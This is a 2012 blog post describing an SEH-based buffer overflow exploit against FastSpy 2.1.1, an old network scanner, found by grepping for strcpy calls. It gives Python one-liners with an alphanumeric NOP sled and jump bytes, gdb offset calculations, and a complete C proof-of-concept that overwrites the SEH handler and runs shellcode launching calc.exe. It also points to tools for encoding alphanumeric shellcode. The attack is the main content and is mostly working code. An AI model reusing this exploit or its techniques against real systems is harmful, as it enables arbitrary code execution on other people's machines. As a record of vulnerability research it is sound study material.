---
categories:
- fastspy
- buffer overflow
comments: false
date: "2012-10-03T00:15:10Z"
title: FastSpy 2.1.1 Buffer Overflow
---

[FastSpy](http://sourceforge.net/projects/fastspy/) is an oooooooooooooooooooold multithreaded network scanner, circa 1999, that doesn't really see any use nowadays.  I started using [Koders](http://koders.com/) to dig around projects and find potential exploits, and ran across this one.  It's drop-dead simple in practice (deceptively so), and there were a few interesting parts to it so I figured I'd throw this up.  At the time of writing, I don't think the original developer is even around, and I haven't seen this posted anywhere else.

While parsing through code for strcpy's, I discovered FastSpy parsing input files with the following:

```
case 'i':
    InputFromFile = TRUE;
    strcpy(InputFileName, optarg);
    break;
```

Where InputFileName is a 128 byte character buffer.  This vulnerability exists with a couple flags used by FastSpy, though it appears they actually read the data in correctly.

I wanted this to be a Windows PoC, so I loaded up PowerShell (who knew, right) and tried it out:

```
.\ImmunityDebugger.exe ./fs.exe $(python -c "print '-i ' + '\x90'*1120")
```

I should note there's a bit of cheating here, because I had already done this and figured out the values for overwriting the NSEH/SEH.  The above will launch Immunity with the FastSpy executable and the passed arguments.  That address will bring us right up to the NSEH.

One interesting bit here is that we're overflowing a filename and we're using Python.  As of writing, os.system() does not allow us to pass addresses as arguments to applications without getting UTF encoded. Because of this, my '\x90' in the above line will not properly encode.  Instead, we need to do a little magic; [here](http://www.blackhatlibrary.net/Ascii_shellcode) is a great source for finding alphanumeric equivalents.  Typically you'd use this thing for obfuscating shellcode to evade IPS/IDS/AV's, but in our case it's different.  I opted for '\x50\x58', which is a POP then a PUSH, so an equivalent two-instruction NOP.

As per the typical SEH exploit, I needed a POP POP RET.  From there, I needed a JMP back into shellcode.  Unfortunately, the JMP opcode, \xeb, isn't going to work because its not available in the alphanumeric set.  Instead we'll use a JE, \x74, to give us enough room to hop back into a bigger jump.  Our command now looks like this:

```
.\ImmunityDebugger.exe ./fs.exe $(python -c "print '-i ' + '\x50\x58'*558 + '\x41\x42\x43\x44' + '\x74\x80\x50\x58' + '\x65\x10\x40\x00' + 'D'*200")
```

Couple of things to note; we've halved our NOP count because each NOP is now two instructions.  I've added the ABCD ASCII values to show where our JE will hop into, the JE instruction, and finally my chosen POP POP RET address.  Here's a shot of the debugger at the JE instruction:

{{ img /images/posts/2012/jump_back.jpg }}

You can see the four letters as instructions just above our JE instruction (`\x41\x42\x43\x44`).  Conditional jumps are restricted to +/- 127, which is why we've got \x80 loaded up.  With this, you can see our NOP sled full of bytes waiting for your shell.  The shellcode needs to be alphanumeric, so I had to run it through msfencode -e x86/mixed_alpha or using Skypher's [ALPHA3](http://code.google.com/p/alpha3/).

In actuality, it was a huge pain to get this to work properly in the environment that I was developing in, but I was curious nonetheless if it was possible.  At this point I decided to switch to C so I could hack it out.  Copying over most of the work I'd already done, I got this:

```
#include <stdio.h>
#include <stdlib.h>


// Exploit Title: FastSpy v2.1.1 Buffer Overflow
// Date: 10/03/12
// Exploit Author: drone
// Software Link: https://sourceforge.net/projects/fastspy/
// Version: 2.1.1
// Tested on: Windows XP SP3

//
// compiled with MS x86 C/C++ compiler v16.00.
// Run in the folder with the FastSpy executable
//
int main (int argc, char **argv)
{
    char command[2000];
    char *buf = (char *)malloc(1141);
    char *nseh = "\xeb\xd9\x90\x90";
    char *seh = "\x65\x10\x40\x00";
    char *njmp = "\xe9\xa4\xfb\xff\xff";
    // calc.exe
    char shellcode[] = "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0";

    int i;
    for ( i = 0; i < 1120; ++i ) {
        buf[i] = 0x41;
    }

    memcpy ( buf+20, shellcode, strlen(shellcode));
    memcpy ( buf+1115, njmp, 5);
    memcpy ( buf+1120, nseh, sizeof(nseh));
    memcpy ( buf+1120+sizeof(nseh), seh, sizeof(seh));
    
    sprintf(command, "\"\"fs.exe\" -i %s\"\"", buf);

    printf("[+] Launching FastSpy...\n");
    
    system(command);

    printf("[+] Exploit done");
    return 0;
}
```

Just a few things to note on this; calculating near jump.  Once we've got the short jump back into controlled space, we need a near jump to further ourselves to the top of shellcode space.  This can be done with the \xe9 opcode.  To calculate the exact distance, we need to subtract the origin address from the destination address.  This can be done with gdb:  

```
p 0x0018ff73 - 0x0018fb17
$3 = 1116
```

Now that we've got the distance, we need the number in hexadecimal.  This can be calculated by taking the negative of the number and converting it to hex:

```
p/x -1116
$4 = 0xfffffba4
```

So now we know that our near jump is going to be `\xe9\xa4\xfb\xff\xff`.

Otherwise the vulnerability is a straight-forward SEH exploit.  I was particularly interested in getting the alphanumeric shell to work, though.
